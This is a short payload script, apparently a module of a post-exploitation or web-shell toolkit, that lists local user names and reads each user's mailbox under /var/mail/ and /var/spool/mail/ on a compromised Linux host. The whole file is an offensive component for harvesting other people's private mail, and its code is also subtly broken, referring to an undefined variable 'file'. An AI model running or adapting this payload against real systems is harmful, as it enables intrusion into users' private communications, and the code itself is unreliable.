#REQUIRE_LINUX
#This payload shows local mails stored on /var/mail/
result = []
directory = []

directory.append('/var/mail/')
directory.append('/var/spool/mail/')

users = run_payload('users_name')
for direct in directory:
    for user in users:
        if read(direct+user) != '':
            result.append('-------------------------')
            result.append('FILE => '+file)
            result.append(direct+user)

result = [p for p in result if p != '']
